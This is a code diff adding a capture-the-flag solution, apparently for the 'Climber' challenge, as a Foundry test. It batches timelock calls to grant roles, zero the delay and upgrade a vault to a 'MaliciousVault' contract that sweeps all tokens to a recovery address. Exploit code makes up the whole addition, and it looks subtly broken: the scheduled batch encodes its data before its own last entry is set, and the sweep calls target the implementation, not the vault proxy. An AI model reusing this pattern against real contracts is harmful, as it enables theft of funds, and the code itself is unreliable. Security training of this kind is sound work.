@@ -85,7 +85,54 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
+        // @audit-info prepare batch operation 
+        MaliciousVault maliciousImpl = new MaliciousVault();
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory data = new bytes[](4);
+
+
+        targets[0] = address(timelock);
+        data[0] = abi.encodeCall(
+            timelock.grantRole,
+            (PROPOSER_ROLE,  address(timelock))
+        );
+        values[0] = 0;
+
+
+        targets[1] = address(timelock);
+        data[1] = abi.encodeCall(
+            timelock.updateDelay,
+            0
+        );
+        values[1] = 0;
+
+
+        targets[2] = address(vault);
+        data[2] = abi.encodeCall(
+            vault.upgradeToAndCall,
+        (address(maliciousImpl), bytes(""))
+        );
+        values[2] = 0;
+
+
+        targets[3] = address(timelock);
+        values[3] = 0;
         
+        data[3] = abi.encodeCall(
+            timelock.schedule,
+            (targets, values, data, bytes32(0))
+        );
+        
+
+        // Execute the whole batch
+        timelock.execute(targets, values, data, bytes32(0));
+
+        // Vault is now malicious — drain everything
+        maliciousImpl.setRecovery(recovery);
+        maliciousImpl.sweepFundss(address(token));
+
     }
 
     /**
@@ -94,5 +141,20 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract MaliciousVault is ClimberVault {
+    address public recovery;
+
+    function setRecovery(address _recovery) external {
+        recovery = _recovery;
+    }
+
+    function sweepFundss(address token) external {
+        DamnValuableToken(token).transfer(
+            recovery,
+            DamnValuableToken(token).balanceOf(address(this))
+        );
     }
 }
